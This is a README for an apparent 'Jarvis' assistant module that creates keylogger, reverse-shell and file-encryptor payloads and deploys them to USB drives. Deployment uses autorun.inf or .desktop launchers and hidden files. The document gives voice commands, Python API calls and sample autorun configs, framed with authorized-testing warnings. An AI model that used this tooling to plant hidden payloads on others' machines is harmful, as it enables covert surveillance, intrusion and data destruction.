# USB Deployment Module

## Overview

USB deployment functionality for deploying payloads to USB drives. Useful for authorized penetration testing and educational purposes.

## ⚠️ WARNING

**FOR AUTHORIZED TESTING ONLY**
- Only use on systems you own or have explicit authorization
- Illegal to use without authorization
- Test in isolated environments
- Modern systems may block autorun features

## Features

### 1. USB Detection
- Automatically detects connected USB drives
- Works on Windows, Linux, and macOS
- Lists drive information (name, path, type)

### 2. Payload Deployment
- Deploy single or multiple payloads
- Optional autorun creation
- Hidden file support (Windows)
- Cross-platform compatibility

### 3. USB Package Creation
- Create complete USB-ready packages
- Includes README files
- Autorun configuration
- Ready for deployment

## Usage

### Voice Commands

**Detect USB Drives:**
```
"Jarvis, detect USB drives"
"Jarvis, find USB"
```

**Deploy Payload:**
```
"Jarvis, deploy keylogger to USB"
"Jarvis, put reverse shell on USB"
"Jarvis, deploy file encryptor to USB with autorun"
```

**List USB Contents:**
```
"Jarvis, list USB contents"
"Jarvis, what's on the USB"
```

**Clean USB:**
```
"Jarvis, clean USB"
"Jarvis, remove payloads from USB"
```

### Python API

**Detect USB:**
```python
from cybersecurity.usb_deployment import USBDeployment

deployer = USBDeployment()
drives = deployer.detect_usb_drives()
print(f"Found {len(drives)} USB drive(s)")
```

**Deploy Payload:**
```python
# Deploy existing payload
result = deployer.deploy_payload_to_usb(
    payload_path="./payloads/keylogger.py",
    usb_drive="E",  # Windows drive letter
    create_autorun=True,
    hidden=True
)

if result.get("success"):
    print(f"Deployed to: {result['destination']}")
```

**Create and Deploy:**
```python
from cybersecurity.usb_integration import USBIntegration

usb = USBIntegration()
result = usb.create_and_deploy_payload(
    payload_type="keylogger",
    usb_drive="E",
    create_autorun=True
)
```

**Create USB Package:**
```python
package = usb.create_usb_ready_package(
    payload_type="reverse_shell",
    output_dir="./usb_packages"
)

# Copy package directory to USB manually
```

## Platform Support

### Windows
- Detects drive letters (A-Z)
- Creates autorun.inf
- Supports hidden files (attrib +H)
- Requires administrator for some operations

### Linux
- Detects mounts in /media and /mnt
- Creates .desktop files (if desktop environment)
- Requires appropriate permissions

### macOS
- Detects volumes in /Volumes
- Limited autorun support
- Requires appropriate permissions

## Autorun Files

### Windows (autorun.inf)
```ini
[autorun]
open=payload.exe
action=Open files
label=USB Files
icon=payload.exe
```

**Note:** Modern Windows (Vista+) may block autorun for security.

### Linux (.desktop)
```ini
[Desktop Entry]
Name=USB Files
Exec=python3 payload.py
Type=Application
```

## Safety Features

- Authorization warnings
- Isolated sandbox for payload creation
- Clear documentation in packages
- Easy cleanup functionality

## Examples

### Example 1: Quick Deployment
```python
from cybersecurity.usb_integration import USBIntegration

usb = USBIntegration()

# Detect USB
drives = usb.usb_deployer.detect_usb_drives()
if drives:
    # Deploy keylogger
    result = usb.create_and_deploy_payload(
        "keylogger",
        drives[0]["drive"],
        create_autorun=False
    )
    print(result)
```

### Example 2: Create Package
```python
# Create complete package
package = usb.create_usb_ready_package(
    payload_type="reverse_shell",
    output_dir="./usb_package"
)

# Package includes:
# - payload.py
# - README.txt
# - autorun.inf (Windows)
```

### Example 3: Clean USB
```python
# Remove all payloads from USB
result = usb.usb_deployer.clean_usb("E")
print(f"Removed {result['count']} file(s)")
```

## Troubleshooting

### "Permission Denied"
- Run as administrator (Windows) or root (Linux)
- Check USB drive is not write-protected
- Verify USB drive is properly mounted

### "USB Drive Not Found"
- Ensure USB is properly connected
- Check USB is mounted (Linux/macOS)
- Try different USB port

### "Autorun Not Working"
- Modern Windows blocks autorun by default
- Requires user interaction on Linux
- Test in isolated environment first

## Best Practices

1. **Always Test First**
   - Test payloads in isolated VM
   - Verify autorun behavior
   - Check compatibility

2. **Use Isolated Environments**
   - Never test on production systems
   - Use dedicated test machines
   - Isolate network if needed

3. **Document Everything**
   - Keep records of deployments
   - Note which systems tested
   - Document results

4. **Clean Up**
   - Remove payloads after testing
   - Use clean_usb() function
   - Verify removal

## Legal Reminders

- ✅ Only use on systems you own
- ✅ Only use with explicit authorization
- ✅ Test in isolated environments
- ❌ Never use on production systems
- ❌ Never use without authorization
- ❌ Never deploy to unauthorized systems

---

**Use responsibly. Test ethically. Learn continuously.**
